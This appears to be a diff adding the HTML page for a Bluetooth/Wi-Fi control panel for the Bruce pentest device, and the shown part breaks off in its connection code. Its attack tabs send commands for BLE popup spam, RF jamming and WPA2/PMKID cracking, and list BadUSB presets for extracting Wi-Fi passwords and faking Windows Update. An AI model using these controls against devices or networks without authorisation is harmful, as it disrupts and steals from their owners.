@@ -1,0 +1,1464 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bruce Ultimate Remote Hub (Web Bluetooth & Wi-Fi)</title>
+    <script src="https://unpkg.com/html5-qrcode"></script>
+    <style>
+        :root {
+            --bg-color: #0a0c14;
+            --card-bg: #131726;
+            --card-sub: #1a1f33;
+            --card-hover: #222944;
+            --primary: #00ff9d;
+            --primary-glow: rgba(0, 255, 157, 0.4);
+            --secondary: #00d2ff;
+            --secondary-glow: rgba(0, 210, 255, 0.4);
+            --accent: #9d4edd;
+            --danger: #ff4757;
+            --warning: #ffa502;
+            --text: #f8fafc;
+            --text-dim: #94a3b8;
+            --border: #232a42;
+            --border-focus: #00ff9d;
+            --radius-lg: 14px;
+            --radius-md: 10px;
+            --radius-sm: 6px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* --- Header --- */
+        header {
+            background: linear-gradient(180deg, #181d30 0%, var(--card-bg) 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .logo {
+            font-size: 1.15rem;
+            font-weight: 900;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 14px var(--primary-glow);
+        }
+
+        .header-badges {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .badge-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            background: #0d101c;
+            border: 1px solid var(--border);
+        }
+
+        .battery-pill {
+            color: var(--primary);
+            border-color: rgba(0, 255, 157, 0.35);
+        }
+
+        .connection-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            background: #0d101c;
+            padding: 6px 10px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+        }
+
+        .mode-toggle {
+            display: flex;
+            background: var(--card-bg);
+            border-radius: 6px;
+            padding: 2px;
+            border: 1px solid var(--border);
+        }
+
+        .mode-toggle button {
+            background: transparent;
+            border: none;
+            color: var(--text-dim);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .mode-toggle button.active {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 2px 8px var(--primary-glow);
+        }
+
+        .conn-actions {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1;
+            justify-content: flex-end;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: var(--danger);
+            transition: all 0.3s;
+        }
+
+        .status-dot.connected {
+            background-color: var(--primary);
+            box-shadow: 0 0 10px var(--primary);
+        }
+
+        .conn-actions input {
+            background: #151828;
+            border: 1px solid var(--border);
+            color: var(--text);
+            font-size: 0.8rem;
+            padding: 4px 8px;
+            border-radius: 6px;
+            width: 130px;
+            outline: none;
+        }
+
+        /* --- Navigation Tabs --- */
+        nav {
+            display: flex;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border);
+            overflow-x: auto;
+            scrollbar-width: none;
+            position: sticky;
+            top: 76px;
+            z-index: 900;
+        }
+
+        nav::-webkit-scrollbar {
+            display: none;
+        }
+
+        nav button {
+            flex: 1;
+            min-width: 85px;
+            padding: 10px 6px;
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            font-weight: 700;
+            font-size: 0.8rem;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+            white-space: nowrap;
+            text-align: center;
+        }
+
+        nav button.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+            background: rgba(0, 255, 157, 0.05);
+        }
+
+        /* --- Main Content --- */
+        main {
+            flex: 1;
+            padding: 14px;
+            max-width: 660px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.25);
+        }
+
+        .card h2 {
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+            color: var(--primary);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .card-sub-header {
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        /* --- Buttons & UI Elements --- */
+        .btn {
+            background: var(--primary);
+            color: #000;
+            border: none;
+            padding: 9px 14px;
+            border-radius: var(--radius-sm);
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 0.88rem;
+            box-shadow: 0 4px 12px var(--primary-glow);
+            transition: all 0.15s ease-in-out;
+            user-select: none;
+        }
+
+        .btn:hover {
+            opacity: 0.95;
+            transform: translateY(-1px);
+        }
+
+        .btn:active {
+            opacity: 0.75;
+            transform: translateY(1px);
+        }
+
+        .btn-secondary {
+            background: var(--secondary);
+            color: #000;
+            box-shadow: 0 4px 12px var(--secondary-glow);
+        }
+
+        .btn-accent {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(157, 78, 221, 0.4);
+        }
+
+        .btn-danger {
+            background: var(--danger);
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(255, 71, 87, 0.35);
+        }
+
+        .btn-warning {
+            background: var(--warning);
+            color: #000;
+            box-shadow: 0 4px 12px rgba(255, 165, 2, 0.35);
+        }
+
+        .btn-outline {
+            background: var(--card-sub);
+            color: var(--text);
+            border: 1px solid var(--border);
+            box-shadow: none;
+        }
+
+        .btn-outline:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+        }
+
+        .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; }
+
+        /* --- Virtual Gamepad & D-Pad --- */
+        .gamepad-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 0;
+            gap: 12px;
+        }
+
+        .dpad-cross {
+            display: grid;
+            grid-template-columns: 52px 52px 52px;
+            grid-template-rows: 52px 52px 52px;
+            gap: 6px;
+        }
+
+        .dpad-btn {
+            background: var(--card-sub);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 8px;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.1s;
+        }
+
+        .dpad-btn:active {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 0 14px var(--primary-glow);
+            transform: scale(0.95);
+        }
+
+        .dpad-btn.center {
+            background: transparent;
+            border: none;
+            cursor: default;
+        }
+
+        .action-btns {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+            max-width: 280px;
+        }
+
+        /* --- Logs & CLI Console --- */
+        .log-box {
+            background: #080a12;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 10px;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            font-size: 0.8rem;
+            height: 150px;
+            overflow-y: auto;
+            color: var(--primary);
+            white-space: pre-wrap;
+            line-height: 1.4;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .stat-box {
+            background: var(--card-sub);
+            padding: 10px 12px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .stat-box .val {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin-top: 2px;
+        }
+
+        .stat-box .lbl {
+            font-size: 0.72rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .input-group {
+            margin-bottom: 10px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .input-group input, .input-group textarea, .input-group select {
+            width: 100%;
+            background: var(--card-sub);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 8px 12px;
+            color: var(--text);
+            font-size: 0.88rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
+            border-color: var(--primary);
+        }
+
+        /* --- TOTP list --- */
+        .totp-item {
+            background: var(--card-sub);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .totp-code {
+            font-size: 1.5rem;
+            font-weight: 800;
+            font-family: monospace;
+            color: var(--primary);
+            letter-spacing: 2px;
+            margin: 2px 0;
+        }
+
+        .progress-bar-wrap {
+            height: 4px;
+            background: #2a2f45;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 6px;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 100%;
+            transition: width 1s linear;
+        }
+
+        #qr-reader {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="header-top">
+            <div class="logo">🦈 BRUCE ALL-IN-ONE HUB</div>
+            <div class="header-badges">
+                <div id="bat-pill" class="badge-pill battery-pill" style="display: none;">
+                    🔋 <span id="bat-val">--%</span>
+                </div>
+                <div class="badge-pill" id="conn-state-pill">
+                    <div id="status-dot" class="status-dot"></div>
+                    <span id="conn-state-text" style="font-size: 0.75rem;">未接続</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="connection-bar">
+            <div class="mode-toggle">
+                <button id="mode-ble-btn" class="active" onclick="setConnMode('ble')">⚡ Web BLE</button>
+                <button id="mode-wifi-btn" onclick="setConnMode('wifi')">🌐 Wi-Fi</button>
+            </div>
+
+            <!-- BLE Mode UI -->
+            <div id="ble-controls" class="conn-actions">
+                <button id="btn-ble-connect" class="btn btn-secondary" style="padding: 5px 12px; width: auto; font-size: 0.8rem;" onclick="toggleBleConnection()">
+                    📡 Bruce にBLE接続
+                </button>
+            </div>
+
+            <!-- Wi-Fi Mode UI -->
+            <div id="wifi-controls" class="conn-actions" style="display: none;">
+                <input type="text" id="device-ip" value="192.168.4.1:8081" placeholder="IP:Port">
+                <button class="btn btn-outline" style="padding: 4px 8px; width: auto; font-size: 0.75rem;" onclick="checkWifiConnection()">Sync</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation Bar -->
+    <nav>
+        <button class="active" onclick="switchTab('remote-pad')">🎮 リモコン</button>
+        <button onclick="switchTab('live-trans')">🎙️ 音声翻訳</button>
+        <button onclick="switchTab('rf-ir')">📡 RF & IR</button>
+        <button onclick="switchTab('wireless')">📶 無線・攻撃</button>
+        <button onclick="switchTab('badusb')">⌨️ BadUSB</button>
+        <button onclick="switchTab('storage')">📁 ストレージ</button>
+        <button onclick="switchTab('totp-ped')">🔐 TOTP & 歩数</button>
+        <button onclick="switchTab('terminal')">💻 CLI 端末</button>
+    </nav>
+
+    <main>
+        <!-- TAB 1: VIRTUAL REMOTE & HARDWARE PAD -->
+        <div id="tab-remote-pad" class="tab-content active">
+            <div class="card">
+                <h2>
+                    <span>🎮 バーチャルコントローラー & D-Pad</span>
+                    <span style="font-size: 0.72rem; color: var(--text-dim);">PCキーボード矢印対応</span>
+                </h2>
+                
+                <div class="gamepad-container">
+                    <div class="dpad-cross">
+                        <div class="dpad-btn center"></div>
+                        <button class="dpad-btn" onclick="sendNav('up')">▲</button>
+                        <div class="dpad-btn center"></div>
+                        
+                        <button class="dpad-btn" onclick="sendNav('prev')">◀</button>
+                        <button class="dpad-btn" style="font-size: 0.85rem; font-weight: 800; color: var(--primary);" onclick="sendNav('sel')">OK</button>
+                        <button class="dpad-btn" onclick="sendNav('next')">▶</button>
+                        
+                        <div class="dpad-btn center"></div>
+                        <button class="dpad-btn" onclick="sendNav('down')">▼</button>
+                        <div class="dpad-btn center"></div>
+                    </div>
+
+                    <div class="action-btns">
+                        <button class="btn btn-danger" style="flex: 1;" onclick="sendNav('esc')">⬅ BACK / ESC</button>
+                        <button class="btn btn-secondary" style="flex: 1;" onclick="sendNav('sel')">✔ SELECT</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>🚀 クイック・メニュー直接ジャンプ</h2>
+                <div class="grid-3" style="margin-bottom: 8px;">
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('loader open badusb')">⌨️ BadUSB</button>
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('ir rx')">📡 IR 受信</button>
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('rf rx')">📻 RF スニファ</button>
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('webui')">🌐 WebUI AP</button>
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('clock')">🕒 時計表示</button>
+                    <button class="btn btn-outline" style="font-size: 0.8rem; padding: 9px 4px;" onclick="sendCli('options')">📋 メニュー一覧</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>⚙️ デバイス制御 & ディスプレイ設定</h2>
+                <div class="input-group">
+                    <label>画面バックライト輝度: <span id="br-val-text" style="color: var(--primary);">80%</span></label>
+                    <input type="range" id="br-slider" min="5" max="255" value="200" style="width: 100%; accent-color: var(--primary);" oninput="onBrightnessChange(this.value)">
+                </div>
+
+                <div class="grid-3" style="margin-top: 10px;">
+                    <button class="btn btn-outline" style="font-size: 0.78rem;" onclick="sendCli('screen color hex 00ff9d')">🟢 サイバー緑</button>
+                    <button class="btn btn-outline" style="font-size: 0.78rem;" onclick="sendCli('screen color hex 00d2ff')">🔵 ネオン青</button>
+                    <button class="btn btn-outline" style="font-size: 0.78rem;" onclick="sendCli('screen color hex ff4757')">🔴 ルビー赤</button>
+                </div>
+
+                <div class="grid-2" style="margin-top: 10px;">
+                    <button class="btn btn-outline" style="font-size: 0.78rem;" onclick="sendCli('tone 1000 200')">🔔 ビープ音</button>
+                    <button class="btn btn-danger" style="font-size: 0.78rem;" onclick="if(confirm('再起動しますか？')) sendCli('reboot')">🔄 本体再起動</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: LIVE TRANSLATE HUD (LFM2.5) -->
+        <div id="tab-live-trans" class="tab-content">
+            <div class="card">
+                <h2>
+                    <span>🎙️ LFM2.5 リアルタイム音声翻訳 HUD</span>
+                    <span id="trans-status-badge" style="font-size: 0.75rem; background: rgba(0,255,157,0.15); color: var(--primary); padding: 3px 8px; border-radius: 6px;">READY</span>
+                </h2>
+
+                <div class="card-sub-header">M5Stick S3 画面プレビュー (240x135):</div>
+                <div style="background: #000; border: 2px solid #1a2236; border-radius: 10px; padding: 6px; display: flex; justify-content: center; margin-bottom: 12px; box-shadow: 0 4px 20px rgba(0,255,157,0.1);">
+                    <img id="trans-preview-img" src="../lfm_audio/preview.png" style="width: 100%; max-width: 360px; height: auto; border-radius: 4px; display: block;" onerror="this.style.opacity=0.3">
+                </div>
+
+                <div class="input-group">
+                    <label>翻訳・文字起こしモード:</label>
+                    <select id="trans-mode-select">
+                        <option value="translate_ja">🗣️ 英語音声 ➔ 🇯🇵 日本語翻訳 (推奨)</option>
+                        <option value="asr_ja">🇯🇵 日本語音声 ➔ 📝 日本語文字起こし</option>
+                        <option value="asr_en">🇺🇸 英語音声 ➔ 📝 英語文字起こし</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>手動字幕送信 (M5Stick LCDへ即時表示):</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="manual-caption-input" placeholder="送信したいテキストを入力...">
+                        <button class="btn" style="width: auto; white-space: nowrap;" onclick="sendManualCaption()">送信</button>
+                    </div>
+                </div>
+
+                <div style="margin-top: 10px;">
+                    <div class="card-sub-header">直近の翻訳・文字起こしログ:</div>
+                    <div id="trans-log-box" class="log-box" style="height: 110px;">[+] LFM2.5-Audio-1.5B-JP Ready.
+[*] PCのマイクで音声を認識すると、ここにリアルタイム字幕が流れます。</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: RF & IR STUDIO -->
+        <div id="tab-rf-ir" class="tab-content">
+            <!-- IR SNIFFER -->
+            <div class="card">
+                <h2>
+                    <span>📡 赤外線 (IR) ロジックアナライザ</span>
+                    <button class="btn btn-outline" style="width: auto; padding: 3px 8px; font-size: 0.75rem;" onclick="fetchIrData()">波形取得</button>
+                </h2>
+                
+                <div class="stat-grid" style="margin-bottom: 10px;">
+                    <div class="stat-box">
+                        <div class="lbl">検出パルス数</div>
+                        <div id="ir-pulse-count" class="val">0</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="lbl">生サンプリング数</div>
+                        <div id="ir-raw-ticks" class="val">0</div>
+                    </div>
+                </div>
+
+                <div style="background: #08090f; border: 1px solid var(--border); border-radius: 8px; padding: 8px; margin-bottom: 10px;">
+                    <canvas id="ir-canvas" width="540" height="110" style="width: 100%; height: 110px; display: block;"></canvas>
+                </div>
+
+                <div class="grid-3" style="margin-bottom: 10px;">
+                    <button class="btn" onclick="replayIr(false)">⚡ 通常リプレイ</button>
+                    <button class="btn btn-outline" onclick="replayIr(true)">⚡ 反転リプレイ</button>
+                    <button class="btn btn-outline" onclick="armIrCapture()">🔄 再待機</button>
+                </div>
+
+                <div class="input-group">
+                    <label>保存名 (Bruce ストレージ /BruceIR/<span id="ir-filename-preview">remote</span>.ir):</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="ir-save-name" value="remote" placeholder="リモコン名">
+                        <button class="btn btn-outline" style="width: auto; white-space: nowrap;" onclick="saveIrToDevice()">💾 保存</button>
+                        <button class="btn btn-outline" style="width: auto; white-space: nowrap;" onclick="downloadIrFile()">⬇️ DL</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RF / Sub-GHz -->
+            <div class="card">
+                <h2>📻 Sub-GHz RF ツール (CC1101 / RF24)</h2>
+                <div class="grid-4" style="margin-bottom: 10px;">
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="sendCli('rf freq 315000000')">315 MHz</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="sendCli('rf freq 433920000')">433.92 MHz</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="sendCli('rf freq 868000000')">868 MHz</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="sendCli('rf freq 915000000')">915 MHz</button>
+                </div>
+                <div class="grid-2">
+                    <button class="btn btn-secondary" onclick="sendCli('rf rx')">📡 RF スニファ開始</button>
+                    <button class="btn btn-danger" onclick="sendCli('rf jam')">⚡ RF キャリア送信</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 4: WIRELESS & ATTACK SUITE -->
+        <div id="tab-wireless" class="tab-content">
+            <!-- BLE ATTACK & MEDIA -->
+            <div class="card">
+                <h2>⚡ BLE スパム & メディア操作</h2>
+                <div class="card-sub-header">BLE Spam プルダウン・ポップアップ攻撃:</div>
+                <div class="grid-2" style="margin-bottom: 12px;">
+                    <button class="btn btn-danger" onclick="sendCli('ble spam apple')">🍎 Apple Popup Spam</button>
+                    <button class="btn btn-danger" onclick="sendCli('ble spam android')">🤖 Android FastPair</button>
+                    <button class="btn btn-danger" onclick="sendCli('ble spam windows')">🪟 Windows SwiftPair</button>
+                    <button class="btn btn-danger" onclick="sendCli('ble spam airtag')">🏷️ AirTag Clone</button>
+                </div>
+
+                <div class="card-sub-header">Bluetooth メディアリモコン操作:</div>
+                <div class="grid-4">
+                    <button class="btn btn-outline" onclick="sendCli('media play')">⏯️ 再生/停止</button>
+                    <button class="btn btn-outline" onclick="sendCli('media prev')">⏮️ 前の曲</button>
+                    <button class="btn btn-outline" onclick="sendCli('media next')">⏭️ 次の曲</button>
+                    <button class="btn btn-outline" onclick="sendCli('media volup')">🔊 音量 UP</button>
+                </div>
+            </div>
+
+            <!-- OFFLOAD CRACKER -->
+            <div class="card">
+                <h2>🔥 スマホ並列オフロード解読 (PMKID / WPA2)</h2>
+                <div class="input-group">
+                    <label>ターゲット SSID</label>
+                    <input type="text" id="crack-ssid" placeholder="Target_WiFi_SSID">
+                </div>
+                <div class="input-group">
+                    <label>AP MAC / STA MAC</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="crack-ap-mac" placeholder="AP: AA:BB:CC:DD:EE:FF">
+                        <input type="text" id="crack-sta-mac" placeholder="Client: 11:22:33:44:55:66">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>PMKID (Hex 32文字)</label>
+                    <input type="text" id="crack-pmkid" placeholder="e.g. 0123456789abcdef0123456789abcdef">
+                </div>
+                <div class="input-group">
+                    <label>辞書ファイル（Wordlist）</label>
+                    <input type="file" id="crack-wordlist-file" accept=".txt">
+                </div>
+
+                <button id="btn-start-crack" class="btn" onclick="startOffloadCrack()">🚀 スマホで爆速解読を開始</button>
+
+                <div style="margin-top: 10px;">
+                    <div class="card-sub-header">解読進捗 / ログ:</div>
+                    <div id="crack-log" class="log-box" style="height: 110px;">Ready for offload computing.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 5: BADUSB & DUCKY SCRIPT -->
+        <div id="tab-badusb" class="tab-content">
+            <div class="card">
+                <h2>⌨️ BadUSB & DuckyScript スタジオ</h2>
+                
+                <div class="input-group">
+                    <label>プリセット ペイロード選択:</label>
+                    <select id="ducky-preset" onchange="loadDuckyPreset(this.value)">
+                        <option value="custom">-- プリセットを選択 --</option>
+                        <option value="wifi_dump">📡 Windows Wi-Fi パスワード抽出</option>
+                        <option value="fake_update">🎭 偽のWindows Update全画面</option>
+                        <option value="rickroll">🎵 Rickroll ブラウザ起動</option>
+                        <option value="lock">🔒 PC ロック (Win+L)</option>
+                        <option value="msgbox">💬 ポップアップ メッセージ表示</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>DuckyScript エディタ:</label>
+                    <textarea id="ducky-code" rows="8" style="font-family: monospace; font-size: 0.82rem;" placeholder="GUI r&#10;DELAY 200&#10;STRING notepad.exe&#10;ENTER&#10;DELAY 500&#10;STRING Hello from Bruce!"></textarea>
+                </div>
+
+                <div class="grid-2">
+                    <button class="btn btn-secondary" onclick="executeDuckyScript()">🚀 即座にタイピング実行</button>
+                    <button class="btn btn-outline" onclick="saveDuckyToBruce()">💾 /BruceBadUSB に保存</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 6: STORAGE EXPLORER -->
+        <div id="tab-storage" class="tab-content">
+            <div class="card">
+                <h2>
+                    <span>📁 ストレージ & SDカード マネージャ</span>
+                    <button class="btn btn-outline" style="width: auto; padding: 3px 8px; font-size: 0.75rem;" onclick="fetchStorageList('/')">更新</button>
+                </h2>
+
+                <div class="grid-4" style="margin-bottom: 10px;">
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="fetchStorageList('/')">📁 / (Root)</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="fetchStorageList('/BruceIR')">📡 /BruceIR</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="fetchStorageList('/BruceRF')">📻 /BruceRF</button>
+                    <button class="btn btn-outline" style="font-size: 0.75rem;" onclick="fetchStorageList('/BruceBadUSB')">⌨️ /BadUSB</button>
+                </div>
+
+                <div id="file-list-container" style="background: #08090f; border: 1px solid var(--border); border-radius: 8px; padding: 8px; max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 0.8rem; margin-bottom: 10px;">
+                    <div style="color: var(--text-dim); text-align: center; padding: 12px;">ファイル一覧を読み込み中...</div>
+                </div>
+
+                <div class="input-group">
+                    <label>ファイル直接操作 (パス指定):</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="storage-file-path" placeholder="/BruceIR/remote.ir">
+                        <button class="btn btn-outline" style="width: auto; white-space: nowrap;" onclick="readStorageFile()">閲覧</button>
+                        <button class="btn btn-danger" style="width: auto; white-space: nowrap;" onclick="deleteStorageFile()">削除</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 7: TOTP & PEDOMETER -->
+        <div id="tab-totp-ped" class="tab-content">
+            <!-- TOTP -->
+            <div class="card">
+                <h2>
+                    <span>🔐 TOTP 二要素認証トークン</span>
+                    <button class="btn btn-outline" style="width: auto; padding: 3px 8px; font-size: 0.75rem;" onclick="fetchTotpList()">更新</button>
+                </h2>
+                
+                <div id="qr-reader" style="display: none;"></div>
+                <button id="btn-scan" class="btn" style="margin-bottom: 12px;" onclick="toggleQrScanner()">📷 QRコードで一発登録</button>
+
+                <div id="totp-list">
+                    <p style="color: var(--text-dim); text-align: center; padding: 12px;">読み込み中...</p>
+                </div>
+            </div>
+
+            <!-- PEDOMETER -->
+            <div class="card">
+                <h2>🚶 歩数計 & ヘルスケア</h2>
+                <div class="stat-grid">
+                    <div class="stat-box">
+                        <div class="lbl">総歩数</div>
+                        <div id="ped-steps" class="val">0</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="lbl">移動距離</div>
+                        <div id="ped-dist" class="val">0.0 m</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="lbl">消費カロリー</div>
+                        <div id="ped-cal" class="val">0.0 kcal</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="lbl">常駐ステータス</div>
+                        <div id="ped-status" class="val" style="font-size: 1.1rem; color: var(--primary);">ACTIVE</div>
+                    </div>
+                </div>
+                <div class="grid-2">
+                    <button class="btn btn-outline" onclick="fetchPedometerData()">データ更新</button>
+                    <button class="btn btn-danger" onclick="resetPedometer()">歩数リセット</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 8: TERMINAL & CLI CONSOLE -->
+        <div id="tab-terminal" class="tab-content">
+            <div class="card">
+                <h2>
+                    <span>💻 Bruce フル機能 CLI ターミナル</span>
+                    <button class="btn btn-outline" style="width: auto; padding: 3px 8px; font-size: 0.75rem;" onclick="clearCliLog()">クリア</button>
+                </h2>
+
+                <div class="card-sub-header">ショートカット コマンド:</div>
+                <div class="grid-4" style="margin-bottom: 10px;">
+                    <button class="btn btn-outline" style="font-size: 0.72rem;" onclick="sendCli('info')">ℹ️ info</button>
+                    <button class="btn btn-outline" style="font-size: 0.72rem;" onclick="sendCli('uptime')">⏱️ uptime</button>
+                    <button class="btn btn-outline" style="font-size: 0.72rem;" onclick="sendCli('free')">🧠 free RAM</button>
+                    <button class="btn btn-outline" style="font-size: 0.72rem;" onclick="sendCli('settings')">⚙️ settings</button>
+                </div>
+
+                <div id="cli-log" class="log-box" style="height: 220px; margin-bottom: 10px;">[+] Web Bluetooth Terminal Ready.
+[*] Bruce にBLE接続するか、Wi-Fi Syncを行ってください。
+</div>
+
+                <div class="input-group" style="margin-bottom: 0;">
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="cli-input" placeholder="コマンド入力 (help, power, ls, tone, led br)..." onkeydown="if(event.key==='Enter') executeCustomCli()">
+                        <button class="btn" style="width: auto; white-space: nowrap;" onclick="executeCustomCli()">送信</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // --- Web Bluetooth UUIDs ---
+        const BRUCE_SERVICE_UUID = '4371ec0b-3d43-49f9-b731-7c72a4a7bb91';
+        const BRUCE_CHAR_UUID = 'd555ed97-bf2a-4f46-b3eb-d1fcdd7325e9';
+        const BATTERY_SERVICE_UUID = '0000180f-0000-1000-8000-00805f9b34fb';
+
+        let connMode = 'ble';
+        let bleDevice = null;
+        let bleServer = null;
+        let bleSerialChar = null;
+        let bleBatteryChar = null;
+
+        let html5QrCode = null;
+        let qrScanning = false;
+        let crackerWorker = null;
+
+        // --- Connection Mode ---
+        function setConnMode(mode) {
+            connMode = mode;
+            document.getElementById('mode-ble-btn').classList.toggle('active', mode === 'ble');
+            document.getElementById('mode-wifi-btn').classList.toggle('active', mode === 'wifi');
+            document.getElementById('ble-controls').style.display = (mode === 'ble') ? 'flex' : 'none';
+            document.getElementById('wifi-controls').style.display = (mode === 'wifi') ? 'flex' : 'none';
+
+            if (mode === 'wifi') checkWifiConnection();
+            else updateBleUiState();
+        }
+
+        // --- Web Bluetooth Logic ---
+        async function toggleBleConnection() {
+            if (bleDevice && bleDevice.gatt.connected) {
